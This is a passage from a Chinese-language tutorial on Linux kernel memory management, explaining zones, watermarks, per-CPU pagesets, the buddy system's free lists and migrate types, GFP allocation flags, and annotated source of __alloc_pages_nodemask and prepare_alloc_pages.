都抽象到一个虚拟数组 <code>vmemmap</code> 中，PFN 也就代表着该页在虚拟空间的位置</p><figure class="highlight c"><figcaption><span>include/asm-generic/memory_model.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __pfn_to_page(pfn)(vmemmap + (pfn))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __page_to_pfn(page)(unsigned long)((page) - vmemmap)</span></span><br></pre></td></tr></table></figure><p>使用简单的加减法即可互相转换</p><h3 id="Zone"><a href="#Zone" class="headerlink" title="Zone"></a>Zone</h3><p>Linux 使用<strong>区</strong>来管理一段内存页，使用 <code>zone</code> 结构体表示，结构体定义位于 <code>include/linux/mmzone.h</code></p><p>区根据地址不同分为不同的区</p><ul><li>ZONE_DMA<ul><li>0 - 16 MB</li></ul></li><li>ZONE_DMA32<ul><li>16 MB - 4 GB</li><li>x86_64 独有</li></ul></li><li>ZONE_NORMAL<ul><li>x86：16 - 896 MB</li><li>x86_64：4 GB+</li></ul></li><li>ZONE_HIGHMEM<ul><li>896 MB+</li><li>x86 独有</li></ul></li></ul><p>下面介绍比较重要的字段</p><h4 id="watermark"><a href="#watermark" class="headerlink" title="_watermark"></a><code>_watermark</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> _watermark[NR_WMARK]; <span class="comment">// NR_WMARK = 3</span></span><br></pre></td></tr></table></figure><p>水位线，每个区从高到低有三档水位线：<code>WMARK_HIGH</code>、<code>WMARK_LOW</code>、<code>WMARK_MIN</code></p><p>Buddy System 会根据空闲内存和水位线比较判断当前的内存情况，进行内存回收</p><h4 id="zone-pgdat"><a href="#zone-pgdat" class="headerlink" title="zone_pgdat"></a><code>zone_pgdat</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> *<span class="title">zone_pgdat</span>;</span></span><br></pre></td></tr></table></figure><p>指向 zone 所属的节点</p><h4 id="pageset"><a href="#pageset" class="headerlink" title="pageset"></a><code>pageset</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span> __<span class="title">percpu</span> *<span class="title">pageset</span>;</span></span><br></pre></td></tr></table></figure><p>多 CPU 的引入会导致条件竞争，其中一个解决办法是锁，但是频繁的加解锁和等待时间造成巨大的开销，因此引入 <code>per_cpu_pageset</code> 结构体，为每一个 CPU 单独准备一个页面仓库 <code>pageset</code>，即每个 CPU 的 <code>pageset</code> 指针指向不同的实体</p><p>Buddy System 初始化时会将页面均匀地放在各个 CPU 的 <code>pageset</code> 中，分配时优先从自己的 <code>pageset</code> 中分配</p><figure class="highlight c"><figcaption><span>include/linux/mmzone.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> <span class="title">pcp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    s8 expire;</span><br><span class="line">    u16 vm_numa_stat_diff[NR_VM_NUMA_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">    s8 stat_threshold;</span><br><span class="line">    s8 vm_stat_diff[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> count;      <span class="comment">// 页面数量</span></span><br><span class="line">    <span class="type">int</span> high;       <span class="comment">// 高水位线</span></span><br><span class="line">    <span class="type">int</span> batch;      <span class="comment">// 如果页面数量为 0，从该 zone 中的补充数量</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// pcp-list 页面链表，一种迁移类型一个链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lists</span>[<span class="title">MIGRATE_PCPTYPES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="free-area"><a href="#free-area" class="headerlink" title="free_area"></a><code>free_area</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> <span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span> <span class="comment">// MAX_ORDER = 11</span></span><br></pre></td></tr></table></figure><p>存放 Buddy System 分阶管理的页面，页面以双向链表形式连接</p><p><img src="/img/Linux_Kernel_%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.assets/free_area.png" alt="free_area"></p><h3 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h3><p>Linux 使用<strong>节点</strong>来管理几个内存区，使用 <code>pglist_data</code> 结构体表示，结构体定义位于 <code>include/linux/mmzone.h</code></p><p>使用内存控制器来划分节点，同一内存控制器下的 CPU 对应的节点内存为<strong>本地内存</strong></p><p>大部分计算机只有一个 Node</p><p>#todo </p><h2 id="Buddy-System"><a href="#Buddy-System" class="headerlink" title="Buddy System"></a>Buddy System</h2><h3 id="内存组织形式"><a href="#内存组织形式" class="headerlink" title="内存组织形式"></a>内存组织形式</h3><p>在 Buddy System 中，按照空闲页面的大小进行分阶（order）管理，第 n 阶就是 2 的 n 次方个页的大小，存储在 <code>zone</code> 的 <code>free_area</code> 中，<strong>页面</strong>为 Buddy System 的最小管理单位</p><p>空闲页面以双向链表的形式进行连接</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// include/linux/mmzone.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> <span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span> <span class="comment">// MAX_ORDER = 11</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> nr_free;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// include/linux/types.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="free-list"><a href="#free-list" class="headerlink" title="free_list"></a><code>free_list</code></h4><p>本质是一个双向链表，由于页面迁移机制，还要按照不同的迁移类型（migrate type）对相同大小页面进行分类</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span>  </span><br><span class="line">    MIGRATE_UNMOVABLE,</span><br><span class="line">    MIGRATE_MOVABLE,</span><br><span class="line">    MIGRATE_RECLAIMABLE,</span><br><span class="line">    MIGRATE_PCPTYPES,</span><br><span class="line">    MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CMA  </span></span><br><span class="line">    MIGRATE_CMA,  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION  </span></span><br><span class="line">    MIGRATE_ISOLATE,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line">    MIGRATE_TYPES  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>MIGRATE_UNMOVABLE：这类型页面在内存当中有着固定的位置，不能移动</li><li>MIGRATE_MOVABLE：这类页面可以随意移动，例如用户空间的页面，我们只需要复制数据后改变页表映射即可</li><li>MIGRATE_RECLAIMABLE：这类页面不能直接移动，但是可以删除，例如映射文件的页</li><li>MIGRATE_PCPTYPES：<code>per_cpu_pageset</code>，即每 CPU 页帧缓存，其迁移仅限于同一节点内</li><li>MIGRATE_CMA：<code>Contiguous Memory Allocator</code>，即连续的物理内存</li><li>MIGRATE_ISOLATE：不能从该链表分配页面，该链表用于跨 NUMA 节点进行页面移动，将页面移动到使用该页面最为频繁的 CPU 所处节点</li><li>MIGRATE_TYPES：表示迁移类型的数目</li></ul><p><img src="/img/Linux_Kernel_%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.assets/free_list.png" alt="free_list"></p><h4 id="nr-free"><a href="#nr-free" class="headerlink" title="nr_free"></a><code>nr_free</code></h4><p>当前 <code>free_area</code> 中的空闲页面数量</p><h3 id="页面分配"><a href="#页面分配" class="headerlink" title="页面分配"></a>页面分配</h3><p>Buddy System 提供了一些用与分配页面的接口函数，它们最终都会调用核心函数 <code>struct page *__alloc_pages_nodemask(gfp_t gfp_mask, unsigned int order, int preferred_nid, nodemask_t *nodemask)</code></p><p>下面围绕核心函数来介绍页面分配机制</p><h4 id="gfp-t"><a href="#gfp-t" class="headerlink" title="gfp_t"></a><code>gfp_t</code></h4><p>GFP 即 Get Free Page</p><p>核心函数的第一个参数 <code>gfp_t</code> 表示在分配页面时的标志位，定义位于 <code>include/linux/gfp.h</code> 中</p><h5 id="内存管理区修饰符"><a href="#内存管理区修饰符" class="headerlink" title="内存管理区修饰符"></a>内存管理区修饰符</h5><p>主要描述从哪块内存区分配内存</p><table><thead><tr><th>Flag</th><th>Description</th></tr></thead><tbody><tr><td>__GFP_DMA</td><td>从 ZONE_DMA 区中分配内存</td></tr><tr><td>__GFP_HIGNMEM</td><td>从 ZONE_HIGHMEM 区中分配内存</td></tr><tr><td>__GFP_DMA32</td><td>从 ZONE_DMA32 区中分配内存</td></tr><tr><td>__GFP_MOVABLE</td><td>内存规整时可以迁移或回收页面</td></tr></tbody></table><h5 id="移动和替换修饰符"><a href="#移动和替换修饰符" class="headerlink" title="移动和替换修饰符"></a>移动和替换修饰符</h5><p>主要描述分配的页面的迁移属性</p><table><thead><tr><th>Flag</th><th>Description</th></tr></thead><tbody><tr><td>__GFP_RECLAIMABLE</td><td>分配的内存页面可以回收</td></tr><tr><td>__GFP_WRITE</td><td>申请的页面会被弄成脏页</td></tr><tr><td>__GFP_HARDWALL</td><td>强制使用 cpuset 内存分配策略</td></tr><tr><td>__GFP_THISNODE</td><td>在指定的节点上分配内存</td></tr><tr><td>__GFP_ACCOUNT</td><td>kmemcg 会记录分配过程</td></tr></tbody></table><h5 id="水位线修饰符"><a href="#水位线修饰符" class="headerlink" title="水位线修饰符"></a>水位线修饰符</h5><table><thead><tr><th>Flag</th><th>Description</th></tr></thead><tbody><tr><td>__GFP_ATOMIC</td><td>高优先级分配内存，分配器可以分配最低警戒水位线下的预留内存</td></tr><tr><td>__GFP_HIGH</td><td>分配内存的过程中不可以睡眠或执行页面回收动作</td></tr><tr><td>__GFP_MEMALLOC</td><td>允许访问所有的内存</td></tr><tr><td>__GFP_NOMEMALLOC</td><td>不允许访问最低警戒水位线下的系统预留内存</td></tr></tbody></table><h5 id="回收修饰符"><a href="#回收修饰符" class="headerlink" title="回收修饰符"></a>回收修饰符</h5><p>主要描述页面回收的相关属性</p><table><thead><tr><th>Flag</th><th>Description</th></tr></thead><tbody><tr><td>__GFP_IO</td><td>启动物理 I/O 传输</td></tr><tr><td>__GFP_FS</td><td>允许调用底层 FS 文件系统。可避免分配器递归到可能已经持有锁的文件系统中，避免死锁</td></tr><tr><td>__GFP_DIRECT_RECLAIM</td><td>分配内存过程中可以使用直接内存回收</td></tr><tr><td>__GFP_KSWAPD_RECLAIM</td><td>内存到达低水位时唤醒 kswapd 线程异步回收内存</td></tr><tr><td>__GFP_RECLAIM</td><td>表示是否可以直接内存回收或者使用 kswapd 线程进行回收</td></tr><tr><td>__GFP_RETRY_MAYFAIL</td><td>分配内存可以可能会失败，但是在申请过程中会回收一些不必要的内存，使整个系统受益</td></tr><tr><td>__GFP_NOFAIL</td><td>内存分配失败后无限制的重复尝试，直到分配成功</td></tr><tr><td>__GFP_NORETRY</td><td>直接页面回收或者内存规整后还是无法分配内存时，不启用 retry 反复尝试分配内存，直接返回 NULL</td></tr></tbody></table><h5 id="行为修饰符"><a href="#行为修饰符" class="headerlink" title="行为修饰符"></a>行为修饰符</h5><p>主要描述分配页面时的行为</p><table><thead><tr><th>Flag</th><th>Fescription</th></tr></thead><tbody><tr><td>__GFP_NOWARN</td><td>关闭内存分配过程中的 WARNING</td></tr><tr><td>__GFP_COMP</td><td>分配的内存页面将被组合成复合页</td></tr><tr><td>__GFP_ZERO</td><td>返回一个全部填充为 0 的页面</td></tr></tbody></table><h5 id="组合类型"><a href="#组合类型" class="headerlink" title="组合类型"></a>组合类型</h5><table><thead><tr><th>Flag</th><th>Element</th><th>Description</th></tr></thead><tbody><tr><td>GFP_ATOMIC</td><td>__GFP_HIGH | __GFP_ATOMIC | __GFP_KSWAPD_RECLAIM</td><td>分配过程不能休眠，分配具有高优先级，可以访问系统预留内存</td></tr><tr><td>GFP_KERNEL</td><td>__GFP_RECLAIM | __GFP_IO | __GFP_FS</td><td>分配内存时可以被阻塞(即休眠)</td></tr><tr><td>GFP_KERNEL_ACCOUNT</td><td>GFP_KERNEL | __GFP_ACCOUNT</td><td>和 GFP_KERNEL 作用一样，但是分配的过程会被 kmemcg 记录</td></tr><tr><td>GFP_NOWAIT</td><td>__GFP_KSWAPD_RECLAIM</td><td>分配过程中不允许因直接内存回收而导致停顿</td></tr><tr><td>GFP_NOIO</td><td>__GFP_RECLAIM</td><td>不需要启动任何的 I/O 操作</td></tr><tr><td>GFP_NOFS</td><td>__GFP_RECLAIM | __GFP_IO</td><td>不会有访问任何文件系统的操作</td></tr><tr><td>GFP_USER</td><td>__GFP_RECLAIM | __GFP_IO | __GFP_FS | __GFP_HARDWALL</td><td>用户空间的进程分配内存</td></tr><tr><td>GFP_DMA</td><td>__GFP_DMA</td><td>从 ZONE_DMA 区分配内存</td></tr><tr><td>GFP_DMA32</td><td>__GFP_DMA32</td><td>从 ZONE_DMA32 区分配内存</td></tr><tr><td>GFP_HIGHUSER</td><td>GFP_USER | __GFP_HIGHMEM</td><td>用户进程分配内存，优先使用 ZONE_HIGHMEM，且这些页面不允许迁移</td></tr><tr><td>GFP_HIGHUSER_MOVABLE</td><td>GFP_HIGHUSER | __GFP_MOVABLE</td><td>和 GFP_HIGHUSER 类似，但是页面可以迁移</td></tr><tr><td>GFP_TRANSHUGE_LIGHT</td><td>GFP_HIGHUSER_MOVABLE | __GFP_COMP | __GFP_NOMEMALLOC | __GFP_NOWARN) &amp; ~__GFP_RECLAIM</td><td>透明大页的内存分配， light 表示不进行内存压缩和回收</td></tr><tr><td>GFP_TRANSHUGE</td><td>GFP_TRANSHUGE_LIGHT | __GFP_DIRECT_RECLAIM</td><td>和 GFP_TRANSHUGE_LIGHT 类似，通常 khugepaged 使用该标志</td></tr></tbody></table><h5 id="常见标志和值"><a href="#常见标志和值" class="headerlink" title="常见标志和值"></a>常见标志和值</h5><table><thead><tr><th>Flag</th><th>Value</th></tr></thead><tbody><tr><td>GFP_KERNEL</td><td>0xCC0</td></tr><tr><td>__GFP_ZERO</td><td>0x100</td></tr><tr><td></td><td></td></tr></tbody></table><h4 id="alloc-context"><a href="#alloc-context" class="headerlink" title="alloc_context"></a><code>alloc_context</code></h4><p>分配结构体，描述一次内存分配的上下文信息，此结构体会在核心参数中使用到</p><figure class="highlight c"><figcaption><span>mm/internal.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> *<span class="title">zonelist</span>;</span></span><br><span class="line"><span class="type">nodemask_t</span> *nodemask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> *<span class="title">preferred_zoneref</span>;</span></span><br><span class="line"><span class="type">int</span> migratetype;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">highest_zoneidx</span>;</span></span><br><span class="line"><span class="type">bool</span> spread_dirty_pages;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="zone-list"><a href="#zone-list" class="headerlink" title="zone_list"></a><code>zone_list</code></h5><p>保存此次分配操作的<strong>区</strong>的列表，实际上就是 <code>zone</code> 结构体的指针数组</p><figure class="highlight c"><figcaption><span>include/linux/mmzone.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> _<span class="title">zonerefs</span>[<span class="title">MAX_ZONES_PER_ZONELIST</span> + 1];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span></span><br><span class="line"><span class="type">int</span> zone_idx;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="preferred-zoneref"><a href="#preferred-zoneref" class="headerlink" title="preferred_zoneref"></a><code>preferred_zoneref</code></h5><p>表示优先进行分配的区</p><h5 id="spread-dirty-pages"><a href="#spread-dirty-pages" class="headerlink" title="spread_dirty_pages"></a><code>spread_dirty_pages</code></h5><p>表示此次分配的页面是否会被修改且需要写回</p><h4 id="alloc-pages-nodemask-函数"><a href="#alloc-pages-nodemask-函数" class="headerlink" title="__alloc_pages_nodemask 函数"></a><code>__alloc_pages_nodemask</code> 函数</h4><p>该函数为核心函数，所有页面分配的 API 函数都是基于该函数的封装</p><p>函数参数</p><ul><li><code>gfp_t gpf_mask</code>：分配标志位</li><li><code>unsigned int order</code>：页面的阶</li><li><code>int prederred_nid</code>：选取的 Node 的 id，一般为该 CPU 所在 node</li><li><code>nodemask_t *nodemask</code>：限制可选取的 mask，一般为 0，不会限制</li></ul><figure class="highlight c"><figcaption><span>mm/page_alloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">alloc_pages_nodemask</span>(<span class="title">gfp_t</span> <span class="title">gfp_mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>, <span class="title">int</span> <span class="title">preferred_nid</span>,</span></span><br><span class="line"><span class="class">                            <span class="title">nodemask_t</span> *<span class="title">nodemask</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> alloc_flags = ALLOC_WMARK_LOW;</span><br><span class="line">    <span class="type">gfp_t</span> alloc_mask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> <span class="title">ac</span> =</span> &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测 order 是否合法</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(order &gt;= MAX_ORDER)) &#123;</span><br><span class="line">        WARN_ON_ONCE(!(gfp_mask &amp; __GFP_NOWARN));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取出允许使用的 gfp 标志位</span></span><br><span class="line">    gfp_mask &amp;= gfp_allowed_mask;</span><br><span class="line">    alloc_mask = gfp_mask;</span><br><span class="line">    <span class="comment">// 分配前的准备</span></span><br><span class="line">    <span class="keyword">if</span> (!prepare_alloc_pages(gfp_mask, order, preferred_nid, nodemask, &amp;ac, &amp;alloc_mask, &amp;alloc_flags))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直到所有的 local zone 都被考虑之前，禁止从 falling back 到内存碎片的传递</span></span><br><span class="line">    alloc_flags |= alloc_flags_nofragment(ac.preferred_zoneref-&gt;zone, gfp_mask);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一次分配尝试，快速分配</span></span><br><span class="line">    page = get_page_from_freelist(alloc_mask, order, alloc_flags, &amp;ac);</span><br><span class="line">    <span class="keyword">if</span> (likely(page))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Apply scoped allocation constraints. This is mainly about GFP_NOFS</span></span><br><span class="line"><span class="comment">     * resp. GFP_NOIO which has to be inherited for all allocation requests</span></span><br><span class="line"><span class="comment">     * from a particular context which has been marked by</span></span><br><span class="line"><span class="comment">     * memalloc_no&#123;fs,io&#125;_&#123;save,restore&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    alloc_mask = current_gfp_context(gfp_mask);</span><br><span class="line">    ac.spread_dirty_pages = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Restore the original nodemask if it was potentially replaced with</span></span><br><span class="line"><span class="comment">     * &amp;cpuset_current_mems_allowed to optimize the fast-path attempt.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ac.nodemask = nodemask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进入慢速分配</span></span><br><span class="line">    page = __alloc_pages_slowpath(alloc_mask, order, &amp;ac);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">if</span> (memcg_kmem_enabled() &amp;&amp; (gfp_mask &amp; __GFP_ACCOUNT) &amp;&amp; page &amp;&amp;</span><br><span class="line">        unlikely(__memcg_kmem_charge_page(page, gfp_mask, order) != <span class="number">0</span>)) &#123;</span><br><span class="line">        __free_pages(page, order);</span><br><span class="line">        page = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    trace_mm_page_alloc(page, order, alloc_mask, ac.migratetype);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>步骤主要分为三步</p><ol><li>检查参数的合法性，做分配前的准备工作</li><li>进行<strong>快速分配</strong>，成功则直接返回结果</li><li>若快速分配失败，进行<strong>慢速分配</strong></li></ol><h5 id="分配前的准备工作"><a href="#分配前的准备工作" class="headerlink" title="分配前的准备工作"></a>分配前的准备工作</h5><p>通过调用 <code>prepare_alloc_page</code> 来初始化 <code>alloc_context</code> 结构体、获取区等</p><figure class="highlight c"><figcaption><span>mm/page_alloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">prepare_alloc_pages</span><span class="params">(<span class="type">gfp_t</span> gfp_mask, <span class="type">unsigned</span> <span class="type">int</span> order,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> preferred_nid, <span class="type">nodemask_t</span> *nodemask,</span></span><br><span class="line"><span class="params">        <span class="keyword">struct</span> alloc_context *ac, <span class="type">gfp_t</span> *alloc_mask,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> *alloc_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 通过 gfp 标志位，获取可使用的区的最大下标</span></span><br><span class="line">    ac-&gt;highest_zoneidx = gfp_zone(gfp_mask);</span><br><span class="line">    <span class="comment">// 获取可用区的列表</span></span><br><span class="line">    ac-&gt;zonelist = node_zonelist(preferred_nid, gfp_mask);</span><br><span class="line">    ac-&gt;nodemask = nodemask;</span><br><span class="line">    <span class="comment">// 获取迁移类型</span></span><br><span class="line">    ac-&gt;migratetype = gfp_migratetype(gfp_mask);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果开启了 cpusets（限制某组进程仅在某些 CPU 和内存上运行），设置对应标志位</span></span><br><span class="line">    <span class="keyword">if</span> (cpusets_enabled()) &#123;</span><br><span class="line">        *alloc_mask |= __GFP_HARDWALL;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 如果是在中断的上下文中，那么这次分配与当前任务的上下文无关</span></span><br><span class="line"><span class="comment">         * 那么选择任意节点都可以</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (!in_interrupt() &amp;&amp; !ac-&gt;nodemask)</span><br><span class="line">            ac-&gt;nodemask = &amp;cpuset_current_mems_allowed;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            *alloc_flags |= ALLOC_CPUSET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fs_reclaim_acquire(gfp_mask);</span><br><span class="line">    fs_reclaim_release(gfp_mask);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否需要进行内存回收</span></span><br><span class="line">    might_sleep_if(gfp_mask &amp; __GFP_DIRECT_RECLAIM);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (should_fail_alloc_page(gfp_mask, order))</span><br><span class="line">        <span class="keyword">return</span> <span 